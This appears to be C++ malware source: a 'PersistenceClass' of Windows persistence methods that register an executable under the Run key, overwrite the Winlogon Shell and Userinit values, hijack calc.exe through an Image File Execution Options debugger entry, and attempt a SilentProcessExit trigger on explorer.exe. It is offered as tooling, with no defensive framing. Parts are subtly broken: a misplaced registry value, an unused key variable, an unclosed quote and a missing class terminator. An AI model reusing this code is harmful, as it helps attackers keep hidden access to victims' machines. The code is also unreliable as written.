#include <windows.h>
#include <string.h>
#include <iostream>
using namespace std;

class PersistenceClass {
    private:
    string exePath;
    public:
    // Constructor
    PersistenceClass(string exePath) {
        this->exePath = exePath;
    }
    // Getters
    string getExePath() {
        return this->exePath;
    }
    // Setters
    void setExePath(string exePath) {
        this->exePath = exePath;
    }
    // Persistence Methods
    // Register Run
    bool persistenceByRunReg(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"salsa", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
        return true;
    }
        RegCloseKey(hkey);
    }
    return false;
    }
    // Register Winlogon
    bool persistenceByWinlogon(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey,(LPCSTR)"Shell", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
    if (RegCloseKey(hkey) == ERROR_SUCCESS) {
        return true;
    }
        RegCloseKey(hkey);
    }
    return false;
    }
    // Execute exe when calc app is open
    bool persistenceByOpenApp(){
        string commandRegAdd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /t reg_sz /d \"cmd /C _calc.exe & " + this->exePath + " /f";
        system("copy C:\\Windows\\system32\\calc.exe C:\\Windows\\system32\\_calc.exe");
        system(commandRegAdd.c_str());
        return true;
    }
    // Execute exe when close explorer app
    bool persistenceByCloseApp(){
        HKEY hkey = NULL;
        DWORD gF = 512;
        DWORD rM = 1;
        const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe";
        const char* silent = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\explorer.exe";
        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, KEY_WRITE, &hkey);
        if (res == ERROR_SUCCESS) {
            RegSetValueEx(hkey,(LPCSTR)"GlobalFlag", 0, REG_DWORD, (unsigned char*)&gF, sizeof(gF));
            RegSetValueEx(hkey,(LPCSTR)"ReportMonitorProcess", 0, REG_DWORD, (unsigned char*)&rM, sizeof(rM));
        if (RegCloseKey(hkey) == ERROR_SUCCESS) {
            return true;
        }
        RegCloseKey(hkey);
        }
        return false;
    }
    // Persistence by Winlogon
    bool persistenceByWinlogonReg(){
        HKEY hkey = NULL;
        LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
        if (res == ERROR_SUCCESS) {
            RegSetValueEx(hkey,(LPCSTR)"Userinit", 0, REG_SZ, (unsigned char*)this->exePath.c_str(), strlen(this->exePath.c_str()));
        if (RegCloseKey(hkey) == ERROR_SUCCESS) {
            return true;
        }
        RegCloseKey(hkey);
        }
        return false;
    }
}